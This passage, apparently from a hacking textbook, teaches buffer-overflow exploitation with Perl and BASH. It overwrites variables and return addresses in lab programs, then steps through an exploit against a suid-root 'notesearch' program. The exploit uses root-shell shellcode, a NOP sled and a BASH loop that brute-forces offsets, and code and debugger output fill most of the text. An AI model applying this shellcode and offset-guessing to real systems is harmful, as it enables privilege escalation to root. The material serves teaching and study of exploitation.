# *__Experimenting with BASH__*

Since so much of hacking is rooted in exploitation and experimentation, the ability to quickly try different things is vital. The __BASH shell__ and __Perl__ are common on most machines and are all that is needed to experiment with exploitation.

_Perl_ is an interpreted programming language with a print command that happens to be particularly suited to generating long sequences of characters. Perl can be used to execute instructions on the command line by using the `-e` switch like this:

<pre style="color: white;">
reader@hacking:~/booksrc $ perl -e 'print "A" x 20;'
AAAAAAAAAAAAAAAAAAAA
</pre>

This command tells Perl to execute the commands found between the single quotes, in this case, a single command of `print "A" x 20;`. This command prints the character A _20_ times.

Any character, such as a non-printable character, can also be printed by using _\x##_, where _##_ is the hexadecimal value of the character. In the following example, this notation is used to print the character __A__, which has the hexadecimal value of _0x41_.

<pre style="color: white;">
reader@hacking:~/booksrc $ perl -e 'print "\x41" x 20;'
AAAAAAAAAAAAAAAAAAAA
</pre>

In addition, string concatenation can be done in Perl with a _period_ (__.__). This can be useful when stringing multiple addresses together.

<pre style="color: white;">
reader@hacking:~/booksrc $ perl -e 'print "A"x20 . "BCD" . "\x61\x66\x67\x69"x2 . "Z";'
AAAAAAAAAAAAAAAAAAAABCDafgiafgiZ
</pre>

An entire shell command can be executed like a function, returning its output in place. This is done by surrounding the command with parentheses and prefixing a dollar sign. Here are two examples:

<pre style="color: white;">
reader@hacking:~/booksrc $ $(perl -e 'print "uname";')
Linux
reader@hacking:~/booksrc $ una$(perl -e 'print "m";')e
Linux
reader@hacking:~/booksrc $
</pre>

In each case, the output of the command found between the parentheses is substituted for the command, and the command `uname` is executed. This exact command-substitution effect can be accomplished with grave accent marks (__`__, the tilted single quote on the tilde key). You can use whichever syntax feels more natural for you; however, the parentheses syntax is easier to read for most people.

<pre style="color: white;">
reader@hacking:~/booksrc $ u`perl -e 'print "na";'`me
Linux
reader@hacking:~/booksrc $ u$(perl -e 'print "na";')me
Linux
reader@hacking:~/booksrc $
</pre>

Command substitution and Perl can be used in combination to quickly generate overflow buffers on the fly. You can use this technique to easily test the _overflow_example.c_ program with buffers of precise lengths.

<pre style="color: white;">
reader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print "A"x30')
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)

[STRCPY] copying 30 bytes into buffer_two

[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAAA'
[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)
Segmentation fault (core dumped)
reader@hacking:~/booksrc $ gdb -q
(gdb) print 0xbffff7f4 - 0xbffff7e0
$1 = 20
(gdb) quit
reader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print "A"x20 . "ABCD"')
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)

[STRCPY] copying 24 bytes into buffer_two

[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAABCD'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAABCD'
[AFTER] value is at 0xbffff7f4 and is 1145258561 (0x44434241)
reader@hacking:~/booksrc $
</pre>

In the output above, _GDB_ is used as a hexadecimal calculator to figure
out the distance between __buffer_two__ (_0xbfffff7e0_) and the __value__ variable
(_0xbffff7f4_), which turns out to be _20_ bytes. Using this distance, the __value__
variable is overwritten with the exact value _0x44434241_, since the characters __A__,
__B__, __C__, and __D__ have the hex values of _0x41_, _0x42_, _0x43_, and _0x44_, respectively. The first character is the least significant byte, due to the little-endian architecture. This means if you wanted to control the value variable with something exact, like _0xdeadbeef_, you must write those bytes into memory in reverse order.

<pre style="color: white;">
reader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print "A"x20 . "\xef\xbe\xad\xde"')
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)

[STRCPY] copying 24 bytes into buffer_two

[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAA??'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAA??'
[AFTER] value is at 0xbffff7f4 and is -559038737 (0xdeadbeef)
reader@hacking:~/booksrc $
</pre>

This technique can be applied to overwrite the return address in the _auth_overflow2.c_ program with an exact value. In the example below, we will overwrite the return address with a different address in _main()_.

<pre style="color: white;">
reader@hacking:~/booksrc $ gcc -g -o auth_overflow2 auth_overflow2.c
reader@hacking:~/booksrc $ gdb -q ./auth_overflow2
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) disass main
Dump of assembler code for function main:
0x08048474 &lt;main+0&gt;:    push ebp
0x08048475 &lt;main+1&gt;:    mov ebp,esp
0x08048477 &lt;main+3&gt;:    sub esp,0x8
0x0804847a &lt;main+6&gt;:    and esp,0xfffffff0
0x0804847d &lt;main+9&gt;:    mov eax,0x0
0x08048482 &lt;main+14&gt;:   sub esp,eax
0x08048484 &lt;main+16&gt;:   cmp DWORD PTR [ebp+8],0x1
0x08048488 &lt;main+20&gt;:   jg 0x80484ab &lt;main+55&gt;
0x0804848a &lt;main+22&gt;:   mov eax,DWORD PTR [ebp+12]
0x0804848d &lt;main+25&gt;:   mov eax,DWORD PTR [eax]
0x0804848f &lt;main+27&gt;:   mov DWORD PTR [esp+4],eax
0x08048493 &lt;main+31&gt;:   mov DWORD PTR [esp],0x80485e5
0x0804849a &lt;main+38&gt;:   call 0x804831c &lt;printf@plt&gt;
0x0804849f &lt;main+43&gt;:   mov DWORD PTR [esp],0x0
0x080484a6 &lt;main+50&gt;:   call 0x804833c &lt;exit@plt&gt;
0x080484ab &lt;main+55&gt;:   mov eax,DWORD PTR [ebp+12]
0x080484ae &lt;main+58&gt;:   add eax,0x4
0x080484b1 &lt;main+61&gt;:   mov eax,DWORD PTR [eax]
0x080484b3 &lt;main+63&gt;:   mov DWORD PTR [esp],eax
0x080484b6 &lt;main+66&gt;:   call 0x8048414 &lt;check_authentication&gt;
0x080484bb &lt;main+71&gt;:   test eax,eax
0x080484bd &lt;main+73&gt;:   je 0x80484e5 &lt;main+113&gt;
0x080484bf &lt;main+75&gt;:   mov DWORD PTR [esp],0x80485fb
0x080484c6 &lt;main+82&gt;:   call 0x804831c &lt;printf@plt&gt;
0x080484cb &lt;main+87&gt;:   mov DWORD PTR [esp],0x8048619
0x080484d2 &lt;main+94&gt;:   call 0x804831c &lt;printf@plt&gt;
0x080484d7 &lt;main+99&gt;:   mov DWORD PTR [esp],0x8048630
0x080484de &lt;main+106&gt;:  call 0x804831c &lt;printf@plt&gt;
0x080484e3 &lt;main+111&gt;:  jmp 0x80484f1 &lt;main+125&gt;
0x080484e5 &lt;main+113&gt;:  mov DWORD PTR [esp],0x804864d
0x080484ec &lt;main+120&gt;:  call 0x804831c &lt;printf@plt&gt;
0x080484f1 &lt;main+125&gt;:  leave
0x080484f2 &lt;main+126&gt;:  ret
End of assembler dump.
(gdb)
</pre>

This section of code shown in bold contains the instructions that display the _Access Granted_ message. The beginning of this section is at _0x080484bf_, so if the return address is overwritten with this value, this block of instructions will be executed. The exact distance between the return address and the start of the password_buffer can change due to different compiler versions and different optimization flags. As long as the start of the buffer is aligned with DWORDs on the stack, this mutability can be accounted for by simply repeating the return address many times. This way, at least one of the instances will overwrite the return address, even if it has shifted around due to compiler optimizations.

<pre style="color: white;">
reader@hacking:~/booksrc $ ./auth_overflow2 $(perl -e 'print "\xbf\x84\x04\x08"x10')

-=-=-=-=-=-=-=-=-=-=-=-=-=-
Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
Segmentation fault (core dumped)
reader@hacking:~/booksrc $
</pre>

In the example above, the target address of _0x080484bf_ is repeated _10_ times to ensure the return address is overwritten with the new target address. When the _check_authentication()_ function returns, execution jumps directly to the new target address instead of returning to the next instruction after the call. This gives us more control; however, we are still limited to using instructions that exist in the original programming. The _notesearch_ program is vulnerable to a buffer overflow on the line
marked in bold here.

```c
int main(int argc, char* argv[]) 
{
    int userid, printing=1, fd; // File descriptor
    char searchstring[100];

    if (argc > 1)                      // If there is an arg
        /////////////////// VULNERABLE LINE ///////////////////
        strcpy(searchstring, argv[1]); // that is the search string;
        /////////////////// VULNERABLE LINE ///////////////////
    else                               // otherwise,
        searchstring[0] = 0;           // search string is empty.
```

The _notesearch_ exploit uses a similar technique to overflow a buffer into the return address; however, it also injects its own instructions into memory and then returns execution there. These instructions are called __shellcode__, and they tell the program to restore privileges and open a shell prompt. This is especially devastating for the _notesearch_ program, since it is _suid root_. Since this program expects multi-user access, it runs under higher privileges so it can access its data file, but the program logic prevents the user from using these higher privileges for anything other than accessing the data file, at least that’s the intention.

But when new instructions can be injected in and execution can be controlled with a buffer overflow, the program logic is meaningless. This technique allows the program to do things it was never programmed to do, while it’s still running with elevated privileges. This is the dangerous combination that allows the _notesearch_ exploit to gain a root shell. Let’s examine the exploit further.

<pre style="color: white;">
reader@hacking:~/booksrc $ gcc -g exploit_notesearch.c
reader@hacking:~/booksrc $ gdb -q ./a.out
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) list 1
1   #include &lt;stdio.h&gt;
2   #include &lt;stdlib.h&gt;
3   #include &lt;string.h&gt;
4   char shellcode[]=
5       "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
6       "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
7       "\xe1\xcd\x80";
8
9   int main(int argc, char* argv[]) {
10      unsigned int i, *ptr, ret, offset=270;
(gdb)
11      char* command, *buffer;
12
13      command = (char*) malloc(200);
14      bzero(command, 200); // Zero out the new memory.
15
16      strcpy(command, "./notesearch \'"); // Start command buffer.
17      buffer = command + strlen(command); // Set buffer at the end.
18
19      if(argc > 1) // Set offset.
20          offset = atoi(argv[1]);
(gdb)
21
22      ret = (unsigned int) &i - offset; // Set return address.
23
<strong><em>24      for (i = 0; i < 160; i+=4)</em></strong> // Fill buffer with return address.
<strong><em>25          *((unsigned int*)(buffer+i)) = ret;</em></strong>
<strong><em>26      memset(buffer, 0x90, 60);</em></strong> // Build NOP sled.
<strong><em>27      memcpy(buffer+60, shellcode, sizeof(shellcode)-1);</em></strong>
28
29      strcat(command, "\'");
30
(gdb) break 26
Breakpoint 1 at 0x80485fa: file exploit_notesearch.c, line 26.
(gdb) break 27
Breakpoint 2 at 0x8048615: file exploit_notesearch.c, line 27.
(gdb) break 28
Breakpoint 3 at 0x8048633: file exploit_notesearch.c, line 28.
(gdb)
</pre>

The notesearch exploit generates a buffer in lines _24_ through _27_ (shown above in bold). The first part is a for loop that fills the buffer with a 4-byte address stored in the __ret__ variable. The loop increments __i__ by _4_ each time. This value is added to the buffer address, and the whole thing is typecast as a unsigned integer pointer. This has a size of 4, so when the whole thing is dereferenced, the entire 4-byte value found in __ret__ is written.

<pre style="color: white;">
(gdb) run
Starting program: /home/reader/booksrc/a.out

Breakpoint 1, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:26
26 memset(buffer, 0x90, 60); // build NOP sled
(gdb) x/40x buffer
0x804a016:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a026:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a036:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a046:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a056:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a066:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a076:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a086:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a096:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a0a6:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
(gdb) x/s command
0x804a008: "./notesearch
'¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶û
ÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿"
(gdb)
</pre>

At the first breakpoint, the buffer pointer shows the result of the for loop. You can also see the relationship between the __command__ pointer and the __buffer__ pointer. The next instruction is a call to _memset()_, which starts at the beginning of the buffer and sets _60_ bytes of memory with the value _0x90_.

<pre style="color: white;">
(gdb) cont
Continuing.

Breakpoint 2, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:27
27 memcpy(buffer+60, shellcode, sizeof(shellcode)-1);
(gdb) x/40x buffer
0x804a016:    0x90909090    0x90909090    0x90909090    0x90909090
0x804a026:    0x90909090    0x90909090    0x90909090    0x90909090
0x804a036:    0x90909090    0x90909090    0x90909090    0x90909090
0x804a046:    0x90909090    0x90909090    0x90909090    0xbffff6f6
0x804a056:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a066:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a076:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a086:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a096:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a0a6:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
(gdb) x/s command
0x804a008: "./notesearch '", '\220' &lt;repeats 60 times&gt;, "¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿
¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿"
(gdb)
</pre>

Finally, the call to _memcpy()_ will copy the shellcode bytes into _buffer+60_.

<pre style="color: white;">
(gdb) cont
Continuing.

Breakpoint 3, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:29
29 strcat(command, "\'");
(gdb) x/40x buffer
0x804a016:    0x90909090    0x90909090    0x90909090    0x90909090
0x804a026:    0x90909090    0x90909090    0x90909090    0x90909090
0x804a036:    0x90909090    0x90909090    0x90909090    0x90909090
0x804a046:    0x90909090    0x90909090    0x90909090    0x3158466a
0x804a056:    0xcdc931db    0x2f685180    0x6868732f    0x6e69622f
0x804a066:    0x5351e389    0xb099e189    0xbf80cd0b    0xbffff6f6
0x804a076:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a086:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a096:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
0x804a0a6:    0xbffff6f6    0xbffff6f6    0xbffff6f6    0xbffff6f6
(gdb) x/s command
0x804a008: "./notesearch '", '\220' &lt;repeats 60 times&gt;, "1À1Û1É\231°¤Í\200j\vXQh//shh/
bin\211ãQ\211âS\211áÍ\200¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿¶ûÿ¿"
(gdb)
</pre>

Now the buffer contains the desired shellcode and is long enough to overwrite the return address. The difficulty of finding the exact location of the return address is eased by using the repeated return address technique. But this return address must point to the shellcode located in the same buffer. This means the actual address must be known ahead of time, before it even goes into memory. This can be a difficult prediction to try to make with a dynamically changing stack. Fortunately, there is another hacking technique, called the __NOP sled__, that can assist with this difficult chicanery. _NOP_ is an assembly instruction that is short for no operation. It is a single-byte instruction that does absolutely nothing. These instructions are sometimes used to waste computational cycles for timing purposes and are actually necessary in the _Sparc_ processor architecture, due to instruction pipelining. In this case, _NOP instructions_ are going to be used for a different purpose: as a fudge factor. We’ll create a large array (or _sled_) of these NOP instructions and place it before the shellcode; then, if the _EIP_ register points to any address found in the NOP sled, it will increment while executing each NOP instruction, one at a time, until it finally reaches the shellcode. This means that as long as the return address is overwritten with any address found in the NOP sled, the _EIP_ register will slide down the sled to the shellcode, which will execute properly. On the _x86_ architecture, the NOP instruction is equivalent to the hex byte _0x90_. This means our completed exploit buffer looks something like this:

<div align="left" width="100%">
<img src="Exploit_Buffer.png?raw=true" alt="Exploit Buffer" width="70%">
</div>

Even with a NOP sled, the approximate location of the buffer in memory must be predicted in advance. One technique for approximating the memory location is to use a nearby stack location as a frame of reference. By subtracting an offset from this location, the relative address of any variable can be obtained.

__From exploit_notesearch.c__

```c
    unsigned int i, *ptr, ret, offset = 270;
    char* command, *buffer;

    command = (char*) malloc(200);
    bzero(command, 200); // Zero out the new memory.

    strcpy(command, "./notesearch \'"); // Start command buffer.
    buffer = command + strlen(command); // Set buffer at the end.

    if (argc > 1) // Set offset.
        offset = atoi(argv[1]);

    ret = (unsigned int) &i - offset; // Set return address.
```

In the _notesearch exploit_, the address of the variable __i__ in _main()_’s stack frame is used as a point of reference. Then an offset is subtracted from that value; the result is the target return address. This offset was previously determined to be _270_, but how is this number calculated?

The easiest way to determine this offset is experimentally. The debugger will shift memory around slightly and will drop privileges when the _suid root_ notesearch program is executed, making debugging much less useful in this case. Since the notesearch exploit allows an optional command-line argument to define the offset, different offsets can quickly be tested.

<pre style="color: white;">
reader@hacking:~/booksrc $ gcc exploit_notesearch.c
reader@hacking:~/booksrc $ ./a.out 100
-------[ end of note data ]-------
reader@hacking:~/booksrc $ ./a.out 200
-------[ end of note data ]-------
reader@hacking:~/booksrc $
</pre>

However, doing this manually is tedious and stupid. _BASH_ also has a for loop that can be used to automate this process. The `seq` command is a simple program that generates sequences of numbers, which is typically used with looping.

<pre style="color: white;">
reader@hacking:~/booksrc $ seq 1 10
1
2
3
4
5
6
7
8
9
10
reader@hacking:~/booksrc $ seq 1 3 10
1
4
7
10
reader@hacking:~/booksrc $
</pre>

When only two arguments are used, all the numbers from the first argument to the second are generated. When three arguments are used, the middle argument dictates how much to increment each time. This can be used with command substitution to drive BASH’s for loop.

<pre style="color: white;">
reader@hacking:~/booksrc $ for i in $(seq 1 3 10)
> do
> echo The value is $i
> done
The value is 1
The value is 4
The value is 7
The value is 10
reader@hacking:~/booksrc $
</pre>

The function of the for loop should be familiar, even if the syntax is a little different. The shell variable __$i__ iterates through all the values found in the grave accents (generated by `seq`). Then everything between the _do_ and _done_ keywords is executed. This can be used to quickly test many different offsets. Since the NOP sled is _60_ bytes long, and we can return anywhere on the sled, there is about _60_ bytes of wiggle room. We can safely increment the offset loop with a step of _30_ with no danger of missing the sled.

<pre style="color: white;">
reader@hacking:~/booksrc $ for i in $(seq 0 30 300)
> do
> echo Trying offset $i
> ./a.out $i
> done
Trying offset 0
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
</pre>

When the right offset is used, the return address is overwritten with a value that points somewhere on the NOP sled. When execution tries to return to that location, it will just slide down the NOP sled into the injected shellcode instructions. This is how the default offset value was discovered.